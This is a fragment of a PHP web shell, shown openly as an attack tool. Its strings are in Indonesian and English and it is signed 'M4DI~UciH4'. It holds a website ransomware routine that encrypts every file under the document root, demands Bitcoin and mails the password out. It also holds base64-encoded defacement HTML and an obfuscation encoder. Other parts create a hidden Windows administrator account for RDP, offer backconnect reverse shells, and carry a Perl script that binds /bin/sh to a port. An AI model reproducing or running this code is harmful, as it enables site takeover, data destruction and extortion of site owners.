WNoPT0zKXthbGVydChtZXNzYWdlKTtyZXR1cm4gZmFsc2U7fX19aWYgKGRvY3VtZW50LmxheWVycyl7ZG9jdW1lbnQuY2FwdHVyZUV2ZW50cyhFdmVudC5NT1VTRURPV04pO2RvY3VtZW50Lm9ubW91c2Vkb3duPWNsaWNrTlM0O31lbHNlIGlmIChkb2N1bWVudC5hbGwmJiFkb2N1bWVudC5nZXRFbGVtZW50QnlJZCl7ZG9jdW1lbnQub25tb3VzZWRvd249Y2xpY2tJRTQ7fWRvY3VtZW50Lm9uY29udGV4dG1lbnU9bmV3IEZ1bmN0aW9uKCJhbGVydChtZXNzYWdlKTtyZXR1cm4gZmFsc2UiKS8vIC0tPjwvc2NyaXB0Pg0KICAgICAgICAgJm5ic3A7ICAgICANCiAgICAgICAgICAgPGNlbnRlcj48aW1nIHNyYz0iaHR0cHM6Ly80LmJwLmJsb2dzcG90LmNvbS8tZ3lYVGVvWWZaWVUvV0xHemQ1SWJORUkvQUFBQUFBQUFBZ0kvN3lFMXdudU1ONHNzZkVUNEJBNEdJcTE4azZ4VEVUdUVRQ0xjQi9zMTYwMC9sb2dvJTJCMy5wbmcid2lkdGg9IjYwMCJoZWlnaHQ9IjYwMCI+PC9jZW50ZXI+PC9ib2R5Pg0KICAgICA8Y2VudGVyPjxpbWcgc3JjPSJodHRwOi8vd3d3Ni4wenowLmNvbS8yMDExLzAzLzE0LzA2LzI2OTIwNTk1Ny5naWYiIGlkPSJidXR0b24xIiBuYW1lPSJidXR0b24xIiBib3JkZXI9IjAiIGhlaWdodD0iNyIgd2lkdGg9IjcwMCI+PC9jZW50ZXI+IA0KICANCiAgICAgICAgICAgICA8Y2VudGVyPjxmb250IGZhY2U9IkpvbGx5IExvZGdlciIgc2l6ZT0iOSIgc3R5bGU9ImNvbG9yOiNmZmZmZmY7dGV4dC1zaGFkb3c6I0ZGMDA5OSAwcHggMHB4IDEwcHgiPiB8IFsgSGFja2VkIEJ5IE00REl+VWNpSDQgXSB8PC9mb250PjwvY2VudGVyPg0KDQo8Y2VudGVyPjxtYXJxdWVlIGJlaGF2aW9yPSJzY3JvbGwiIGRpcmVjdGlvbj0ibGVmdCIgc2Nyb2xsYW1vdW50PSIxMzAiIHNjcm9sbGRlbGF5PSI0MCIgd2lkdGg9IjEwMCUiPg0KDQo8Zm9udCANCg0KY29sb3I9IndoaXRlIiBzaXplPSIzIj5fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXzwvZm9udD48L21hcnF1ZWU+PC9jZW50ZXI+DQoNCjxjZW50ZXI+PG1hcnF1ZWUgYmVoYXZpb3I9InNjcm9sbCIgZGlyZWN0aW9uPSJyaWdodCIgc2Nyb2xsYW1vdW50PSIxMzAiIHNjcm9sbGRlbGF5PSI0MCIgd2lkdGg9IjEwMCUiPg0KDQo8Zm9udCANCg0KY29sb3I9InJlZCIgc2l6ZT0iMyI+X19fX25nZW50b3RfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19Mb19fX19fX19fX19fX19fX19fX19fX188L2ZvbnQ+PC9tYXJxdWVlPjwvY2VudGVyPjxzdHlsZSBzY29wZWQ9InNjb3BlZCIgdHlwZT0idGV4dC9jc3MiPg0KI2NvdW50ZG93bnBlbmFpbmRpZ28ge2JhY2tncm91bmQ6YmxhY2s7Y29sb3I6cmVkO2ZvbnQtZmFtaWx5Ok9zd2FsZCwgQXJpYWwsIFNhbnMtc2VyaWY7Zm9udC1zaXplOjIwcHg7dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO3RleHQtYWxpZ246Y2VudGVyO3BhZGRpbmc6MTBweCAwO2ZvbnQtd2VpZ2h0Om5vcm1hbDt9DQoudGVrcyB7Y29sb3I6d2hpdGV9DQo8L3N0eWxlPg0KPGRpdiBpZD0iY291bnRkb3ducGVuYWluZGlnbyI+DQo8c3BhbiBpZD0iY291bnRkb3duIj48L3NwYW4+DQo8L2Rpdj4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCi8vPCFbQ0RBVEFbDQovLyBzZXQgdGhlIGRhdGUgd2UncmUgY291bnRpbmcgZG93biB0bw0KdmFyIHRhcmdldF9kYXRlID0gbmV3IERhdGUoIkp1bmUgMjgsIDIwMjEiKS5nZXRUaW1lKCk7DQovLyB2YXJpYWJsZXMgZm9yIHRpbWUgdW5pdHMNCnZhciBkYXlzLCBob3VycywgbWludXRlcywgc2Vjb25kczsNCi8vIGdldCB0YWcgZWxlbWVudA0KdmFyIGNvdW50ZG93biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb3VudGRvd24iKTsNCi8vIHVwZGF0ZSB0aGUgdGFnIHdpdGggaWQgImNvdW50ZG93biIgZXZlcnkgMSBzZWNvbmQNCnNldEludGVydmFsKGZ1bmN0aW9uICgpIHsNCi8vIGZpbmQgdGhlIGFtb3VudCBvZiAic2Vjb25kcyIgYmV0d2VlbiBub3cgYW5kIHRhcmdldA0KdmFyIGN1cnJlbnRfZGF0ZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KdmFyIHNlY29uZHNfbGVmdCA9ICh0YXJnZXRfZGF0ZSAtIGN1cnJlbnRfZGF0ZSkgLyAxMDAwOw0KLy8gZG8gc29tZSB0aW1lIGNhbGN1bGF0aW9ucw0KZGF5cyA9IHBhcnNlSW50KHNlY29uZHNfbGVmdCAvIDg2NDAwKTsNCnNlY29uZHNfbGVmdCA9IHNlY29uZHNfbGVmdCAlIDg2NDAwOw0KaG91cnMgPSBwYXJzZUludChzZWNvbmRzX2xlZnQgLyAzNjAwKTsNCnNlY29uZHNfbGVmdCA9IHNlY29uZHNfbGVmdCAlIDM2MDA7DQptaW51dGVzID0gcGFyc2VJbnQoc2Vjb25kc19sZWZ0IC8gNjApOw0Kc2Vjb25kcyA9IHBhcnNlSW50KHNlY29uZHNfbGVmdCAlIDYwKTsNCi8vIGZvcm1hdCBjb3VudGRvd24gc3RyaW5nICsgc2V0IHRhZyB2YWx1ZQ0KICBjb3VudGRvd24uaW5uZXJIVE1MID0gZGF5cyArICIgPHNwYW4gY2xhc3M9J3Rla3MnPmRheTwvc3Bhbj4gIiArIGhvdXJzICsgIiA8c3BhbiBjbGFzcz0ndGVrcyc+aG91cnM8L3NwYW4+ICINCiAgKyBtaW51dGVzICsgIiA8c3BhbiBjbGFzcz0ndGVrcyc+bWludXRlczwvc3Bhbj4gIiArIHNlY29uZHMgKyAiIDxzcGFuIGNsYXNzPSd0ZWtzJz5zZWNvbmQgPGJyLz5pIHNodXRkb3duIHlvdXIgc2l0ZTwvc3Bhbj4iOw0KfSwgMTAwMCk7DQovL11dPg0KPC9zY3JpcHQ+ICAgICAgICANCiAgICAgICAgICAgICA8Y2VudGVyPjxmb250IGZhY2U9IkpvbGx5IExvZGdlciIgc2l6ZT0iOSIgY29sb3I9ImN5YW4iPiBIZWxsbyBBZG1pbjxicj4NCjxjZW50ZXI+PGZvbnQgZmFjZT0iSm9sbHkgTG9kZ2VyIiBzaXplPSI3Ij5Zb3VyIFdlYnNpdGUgU2VjdXJpdHkgaXMgVmVyeSBsb3chISEgPGJyPlBsZWFzZSBVcGdyYWRlIFlvdSBTaXRlIFNlY3VyaXR5IDxicj5PdGhlcndpc2UgWW91IFdpbGwgSGFjayBBZ2Fpbjxicj5Eb24ndCBmb3JnZXQgTWUgOikgPGJyPg0KPGNlbnRlcj4gPC9mb250PjxtYXJxdWVlIGJlaGF2aW9yPSJzY3JvbGwiIGRpcmVjdGlvbj0ibGVmdCIgc2Nyb2xsYW1vdW50PSIxNyIgd2lkdGg9IjcwJSI+DQo8L2ZvbnQ+PC9tYXJxdWVlPjwvY2VudGVyPg0KDQoNCjwvdGFibGU+DQo8L2JvZHk+DQogPGh0bWw+DQo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCI+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJEZWNyeXB0Ij4NCjwvZm9ybT4NCjxicj5Db250YWN0IG1lIDogdW5kZXJ4cGxvaXRAZ21haWwuY29tPGJyPg0KPD9waHANCiAgICBpZighZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10pKXsNCiAgICAgICRpcD0kX1NFUlZFUlsnSFRUUF9DTElFTlRfSVAnXTsNCiAgICB9DQogICAgZWxzZWlmKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpew0KICAgICAgJGlwPSRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX0ZPUiddOw0KICAgIH0NCiAgICBlbHNlew0KICAgICAgJGlwPSRfU0VSVkVSWydSRU1PVEVfQUREUiddOw0KICAgIH0NCiAkaG9zdG5hbWUgPSBnZXRob3N0YnlhZGRyKCRfU0VSVkVSWydSRU1PVEVfQUREUiddKTsNCj8+DQo8P3BocCBlY2hvICRfU0VSVkVSWydSRU1PVEVfQUREUiddOyA/PiAtIA0KPD9waHAgZWNobyAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsgPz4gLSANCjw/cGhwIGVjaG8gIldlYiBTcmV2ZXIgOiAiLiRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXTsgPz4NCjxicj4NCjxidXR0b24gb25jbGljaz0icGxheVBhdXNlKCkiIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkIGJsYWNrOyI+UGxheSBtdXNpYzwvYnV0dG9uPjxidXR0b24gb25jbGljaz0icGxheVBhdXNlKCkiIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkIGJsYWNrOyI+UGF1c2UgbXVzaWM8L2J1dHRvbj4gDQoJPGJyPg0KCTxhdWRpbyBpZD0icCIgd2lkdGg9IjQ2MCI+DQoJICA8c291cmNlIHNyYz0iaHR0cHM6Ly80LnRvcDR0b3AubmV0L21fMTQyNzdkZWE3MC5tcDMiIHR5cGU9ImF1ZGlvL21wMyI+DQoJPC9hdWRpbz4NCjxzY3JpcHQ+DQp2YXIgbXlNdXNpYyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwIik7IA0KDQpmdW5jdGlvbiBwbGF5UGF1c2UoKSB7IA0KICAgIGlmIChteU11c2ljLnBhdXNlZCkgDQogICAgICAgIG15TXVzaWMucGxheSgpOyANCiAgICBlbHNlIA0KICAgICAgICBteU11c2ljLnBhdXNlKCk7IA0KfSANCjwvc2NyaXB0Pg0KPGJyPg0KCTx0YWJsZSB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIzMCUiPg==");
$q = str_replace('jancokjaran', md5($_POST['pass']), $file);
$w = str_replace('indomilk87@gmail.com', $_POST['email'], $q);
$e = str_replace('kontolanjing', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Done!<br>";
}
function encdir($dir){
    $files = array_diff(scandir($dir), array('.', '..'));
        foreach($files as $file) {
            if(is_dir($dir."/".$file)){
                encdir($dir."/".$file);
            } else {
                encfile($dir."/".$file);
               
        }
    }
}
if(isset($_POST['pass'])){
    encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['HTTP_HOST']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>
<center>
<h1>&lt;&lt;-=RANSOMEWARE=-&gt;&gt;</h1>
<font color="#19f211" style="text-shadow: 3px 3px 9px blue; font-size: 12px;">                       
<pre>
<font class="img" color="red">
                    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶                   
                 ¶¶¶¶¶¶             ¶¶¶¶¶¶¶                
              ¶¶¶¶                       ¶¶¶¶              
             ¶¶¶                             ¶¶            
            ¶¶                                ¶¶           
           ¶¶                                 ¶¶          
          ¶¶                                   ¶¶          
          ¶¶ ¶¶                             ¶¶ ¶¶          
          ¶¶ ¶¶                             ¶¶  ¶          
          ¶¶ ¶¶                             ¶¶  ¶          
          ¶¶  ¶¶                            ¶¶ ¶¶          
          ¶¶  ¶¶                           ¶¶  ¶¶          
           ¶¶ ¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶ ¶¶           
            ¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶           
             ¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶             
    ¶¶¶       ¶¶  ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶¶   
   ¶¶¶¶¶     ¶¶   ¶¶¶¶¶¶¶   ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶¶  
  ¶¶   ¶¶    ¶¶     ¶¶¶    ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶  
 ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶  ¶¶¶¶    ¶¶¶ 
¶¶         ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶        ¶¶
¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶
  ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶              ¶¶¶ ¶¶     ¶¶¶¶¶¶ ¶¶¶ 
          ¶¶¶¶¶¶  ¶¶¶  ¶¶           ¶¶  ¶¶¶  ¶¶¶¶¶¶        
              ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶              
                  ¶¶ ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶                 
                ¶¶¶¶  ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶   ¶¶¶¶¶              
            ¶¶¶¶¶ ¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶ ¶¶¶¶¶            
    ¶¶¶¶¶¶¶¶¶¶     ¶¶                 ¶¶      ¶¶¶¶¶¶¶¶¶    
   ¶¶           ¶¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶          ¶¶   
    ¶¶¶     ¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶     ¶¶¶    
      ¶¶   ¶¶¶           ¶¶¶¶¶¶¶¶¶           ¶¶¶   ¶¶      
      ¶¶  ¶¶                                   ¶¶  ¶¶      
       ¶¶¶¶                                     ¶¶¶¶       
</font>
<h1>&lt;&lt; M4DI~UciH4 &gt;&gt;</h1>
<font color="white" style="text-shadow: 3px 3px 9px blue; font-size: 12px;">  
<br><br><hr><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('indomilk87@gmail.com','tes','tes')) { echo "ON"; } else { echo "OFF"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Encrypt : <input type="text" name="pass"> Your Email : <input type="text" name="email">
<br><br>
Your Bitcoin Address : <input type="text" name="btc"> Your Price : <input type="text" name="price">
<br><br>
<input type="submit" value="Encrypt">
</form>
</div>
<?php
}
if($_GET['do'] == 'hashgen') {
 $submit = $_POST['enter'];
 if (isset($submit)) {
 $pass = $_POST['password']; // password
 $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 $hash = md5($pass); // md5 hash #1
 $md4 = hash("md4", $pass);
 $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
 $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
 $hash1 = sha1($pass); // sha1 hash #4
 $sha256 = hash("sha256", $text);
 $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
 }
 echo '<form action="" method="post">';
 echo '<center><h2>Hash Generator</h2>';
 echo '<table>';
 echo 'Masukkan teks yang ingin di encrypt: ';
 echo '<input class="inputz" type="text" name="password" size="40">';
 echo '<input class="inputzbut" type="submit" name="enter" value="Hash!">';
 echo '<br>';
 echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
 echo 'MD5: <input class=inputz type=text size=50 value='.$hash.'><br><br>';
 echo 'MD4: <input class=inputz type=text size=50 value='.$md4 .'><br><br>';
 echo 'MD5 with Salt: <input class=inputz type=text size=50 value='.$hash_md5.'><br><br>';
 echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value='.$hash_md5_double.'><br><br>';
 echo 'Sha1: <input class=inputz type=text size=50 value='.$hash1 .'><br><br>';
 echo 'Sha256: <input class=inputz type=text size=50 value='.$sha256.'><br><br>';
 echo 'Sha1 with Salt: <input class=inputz type=text size=50 value='.$hash1_sha1.'><br><br>';
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
 }
if($_GET['do'] == 'endec') {
 @ini_set('output_buffering',0); 
 @ini_set('display_errors', 0);
 $text = $_POST['code'];
 ?>
 <center>
 <h2>Encode And Decode</h2>
 <form method="post">
 <br>
 <textarea class='form-control con7' cols='60' rows='10' name="code"></textarea>
 <br><br>
 <select class='form-control con7' size="1" name="ope">
 <center>
 <option value="">Select</option>
 <option value="urlencode">url</option>
 <option value="base64">base64</option>
 <option value="ur">convert_uu</option>
 <option value="json">json</option>
 <option value="gzinflates">gzinflate - base64</option>
 <option value="str2">str_rot13 - base64</option>
 <option value="gzinflate">str_rot13 - gzinflate - base64</option>
 <option value="gzinflater">gzinflate - str_rot13 - base64</option>
 <option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
 <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
 <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
 <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
 </center>
 </select>
 &nbsp;<br><br><input class='inputz' type='submit' name='submit' value='Encode'>
 <input class='inputz' type='submit' name='submits' value='Decode'>
 </form>
 <br>
 <?php 
 $submit = $_POST['submit'];
 if (isset($submit)){
 $op = $_POST["ope"];
 switch ($op) {case 'base64': $codi=base64_encode($text);
 break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
 break;case 'json' : $codi=json_encode(utf8_encode($text));
 break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
 break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
 break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
 break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
 break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
 break;case 'str2' : $codi=base64_encode(str_rot13($text));
 break;case 'urlencode' : $codi=rawurlencode($text);
 break;case 'ur' : $codi=convert_uuencode($text);
 break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
 break;default:break;}}
 
 $submit = $_POST['submits'];
 if (isset($submit)){
 $op = $_POST["ope"];
 switch ($op) {case 'base64': $codi=base64_decode($text);
 break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
 break;case 'json' : $codi=utf8_decode(json_decode($text));
 break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
 break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
 break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
 break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
 break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
 break;case 'str2' : $codi=str_rot13(base64_decode($text));
 break;case 'urlencode' : $codi=rawurldecode($text);
 break;case 'ur' : $codi=convert_uudecode($text);
 break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
 break;default:break;}}
 $html = htmlentities(stripslashes($codi));
 echo "<form><textarea cols=60 rows=10 class='form-control con7' >".$html."</textarea></center></form><br/><br/>";
 }
if(isset($_GET['do']) && ($_GET['do'] == 'hashid')) {
if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult = "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Entered";
	}
	
	?>
	<center><br><Br><br>
	
		<form action="" method="POST">
		<table border="1">
		<h1>Hash Identification</h1>
		<B><tr><td>Enter Hash : </tr></b></td>
                <tr><td><input type="text" name="hash" size='60' class="inputz" /></tr></td>
                <tr><td><input type="submit" class="inputz" name="gethash" value="Identify Hash" /></tr></td>
		<b><tr><td>Result : <?php echo $hashresult; ?></tr></td></b>
	</table></form>
	</center>
	
	<?php
 }
if($_GET['do'] == 'crdp') {
  if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
    if($_POST['create']) {
      $user = htmlspecialchars($_POST['user']);
      $pass = htmlspecialchars($_POST['pass']);
      if(preg_match("/$user/", exe("net user"))) {
        echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada njenc</font>";
      } else {
        $add_user   = exe("net user $user $pass /add");
          $add_groups1 = exe("net localgroup Administrators $user /add");
          $add_groups2 = exe("net localgroup Administrator $user /add");
          $add_groups3 = exe("net localgroup Administrateur $user /add");
          echo "[ RDP ACCOUNT INFO ]<br>
          ------------------------------<br>
          IP: <font color=lime>".$ip."</font><br>
          Username: <font color=lime>$user</font><br>
          Password: <font color=lime>$pass</font><br>
          ------------------------------<br><br>
          [ STATUS ]<br>
          ------------------------------<br>
          ";
          if($add_user) {
            echo "[add user] -> <font color='lime'>Berhasil Njenc</font><br>";
          } else {
            echo "[add user] -> <font color='red'>Gabisa Lu Buriq</font><br>";
          }
          if($add_groups1) {
              echo "[add localgroup Administrators] -> <font color='lime'>Berhasil Njenc</font><br>";
          } elseif($add_groups2) {
                echo "[add localgroup Administrator] -> <font color='lime'>Berhasil Njenc</font><br>";
          } elseif($add_groups3) { 
                echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil Njenc</font><br>";
          } else {
            echo "[add localgroup] -> <font color='red'>Gabisau Buriq</font><br>";
          }
          echo "------------------------------<br>";
      }

    } elseif($_POST['s_opsi']) {
      $user = htmlspecialchars($_POST['r_user']);
      if($_POST['opsi'] == '1') {
        $cek = exe("net user $user");
        echo "Checking username <font color=lime>$user</font> ....... ";
        if(preg_match("/$user/", $cek)) {
          echo "[ <font color=lime>Sudah ada njenc</font> ]<br>
          ------------------------------<br><br>
          <pre>$cek</pre>";
        } else {
          echo "[ <font color=red>belum ada njenc</font> ]";
        }
      } elseif($_POST['opsi'] == '2') {
        $cek = exe("net user $user M4DI~UciH4");
        if(preg_match("/$user/", exe("net user"))) {
          echo "[change password: <font color=lime>indoxploit</font>] -> ";
          if($cek) {
            echo "<font color=lime>Berhasil Njenc</font>";
          } else {
            echo "<font color=red>Gabisa Lu Buriq</font>";
          }
        } else {
          echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
        }
      } elseif($_POST['opsi'] == '3') {
        $cek = exe("net user $user /DELETE");
        if(preg_match("/$user/", exe("net user"))) {
          echo "[remove user: <font color=lime>$user</font>] -> ";
          if($cek) {
            echo "<font color=lime>Berhasil Njenc</font>";
          } else {
            echo "<font color=red>Gabisa Lu Buriq</font>";
          }
        } else {
          echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
        }
      } else {
        //
      }
    } else {
      echo "-- Create RDP --<br>
      <form method='post'>
      <input type='text' name='user' placeholder='username' value='M4DI~UciH4' required>
      <input type='text' name='pass' placeholder='password' value='madiganteng12' required>
      <input type='submit' name='create' value='=>>'>
      </form>
      -- Option --<br>
      <form method='post'>
      <input type='text' name='r_user' placeholder='username' required>
      <select name='opsi'>
      <option value='1'>Cek Username</option>
      <option value='2'>Ubah Password</option>
      <option value='3'>Hapus Username</option>
      </select>
      <input type='submit' name='s_opsi' value='=>>'>
      </form>
      ";
    }
  } else {
    echo "<font color=red>ID = Fitur ini hanya dapat digunakan dalam Windows Server Ya Tod!<br>EN = This feature can only be used in Windows Server. Yes Tod !</font>";
  }
}
if($_GET['backconnect'] == 'tool'){
echo "<br><br><center><form method=post>
<br>	<span>Bind port to /bin/sh [Perl]</span><br/>
	Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='=>>'>
<br><br>
		<span>Back-connect</span><br/>
	Server: <input type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
   <input type=submit value='>>'>";
	if($_POST['bpl']) {
	$bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
	$brt=@fopen('bp.pl','w');
fwrite($brt,$bp);
